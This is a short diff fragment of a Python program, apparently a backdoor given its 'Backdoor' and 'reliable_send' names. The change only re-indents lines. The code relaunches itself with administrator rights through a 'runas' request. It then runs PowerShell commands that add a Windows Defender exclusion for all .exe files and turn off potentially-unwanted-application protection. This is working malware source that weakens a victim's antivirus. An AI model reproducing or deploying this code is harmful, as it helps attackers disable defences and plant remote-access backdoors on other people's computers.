@@ -11,14 +11,14 @@ import win32com
 ASADMIN = "asadmin"
 
 if sys.argv[-1] != ASADMIN:
-script = os.path.abspath(sys.argv[0])
-params = " ".join([script] + sys.argv[1:] + [ASADMIN])
-win32com.shell.shell.ShellExecuteEx(
-lpVerb="runas", lpFile=sys.executable, lpParameters=params
-)
-sys.exit(0)
-os.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
-os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
+  script = os.path.abspath(sys.argv[0])
+  params = " ".join([script] + sys.argv[1:] + [ASADMIN])
+  win32com.shell.shell.ShellExecuteEx(
+  lpVerb="runas", lpFile=sys.executable, lpParameters=params
+  )
+  sys.exit(0)
+  os.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
+  os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
 
 def reliable_send(data):
 jsondata = Backdoor.json.dumps(data)
